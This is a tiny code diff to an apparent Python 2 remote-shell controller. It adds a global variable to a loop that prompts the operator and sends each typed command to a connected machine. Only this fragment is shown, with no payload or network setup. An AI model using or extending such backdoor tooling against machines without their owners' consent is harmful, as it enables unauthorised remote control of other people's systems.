@@ -19,6 +19,7 @@ def reliable_recv():
             continue
 
 def shell():
+    global count
     while True:
         command = raw_input("* Shell#~%s: " % str(ip))
         reliable_send(command)
